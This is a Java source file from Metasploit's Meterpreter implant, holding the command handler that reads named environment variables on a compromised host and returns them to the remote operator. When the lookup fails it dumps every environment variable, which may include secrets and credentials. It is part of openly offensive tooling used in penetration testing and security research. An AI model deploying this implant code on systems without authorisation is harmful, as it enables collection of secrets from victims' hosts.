package com.metasploit.meterpreter.stdapi;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.util.List;
import java.util.Map;

public class stdapi_sys_config_getenv implements Command {
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        try {
            List envVars = request.getValues(TLVType.TLV_TYPE_ENV_VARIABLE);
            for (int i = 0; i < envVars.size(); ++i) {
                String envVar = (String) envVars.get(i);
                if (envVar.startsWith("$") || envVar.startsWith("%")) {
                    envVar = envVar.substring(1);
                }
                if (envVar.endsWith("$") || envVar.endsWith("%")) {
                    envVar = envVar.substring(0, envVar.length() - 1);
                }

                String envVal = System.getenv(envVar);
                if (envVal != null) {
                    TLVPacket grp = new TLVPacket();
                    grp.add(TLVType.TLV_TYPE_ENV_VARIABLE, envVar);
                    grp.add(TLVType.TLV_TYPE_ENV_VALUE, envVal);
                    response.addOverflow(TLVType.TLV_TYPE_ENV_GROUP, grp);
                }
            }
        } catch (IllegalArgumentException e) {
            Map<String,String> envVals = System.getenv();
            for (Map.Entry<String, String> entry : envVals.entrySet()) {
                TLVPacket grp = new TLVPacket();
                grp.add(TLVType.TLV_TYPE_ENV_VARIABLE, entry.getKey());
                grp.add(TLVType.TLV_TYPE_ENV_VALUE, entry.getValue());
                response.addOverflow(TLVType.TLV_TYPE_ENV_GROUP, grp);
            }
        }
        return ERROR_SUCCESS;
    }
}
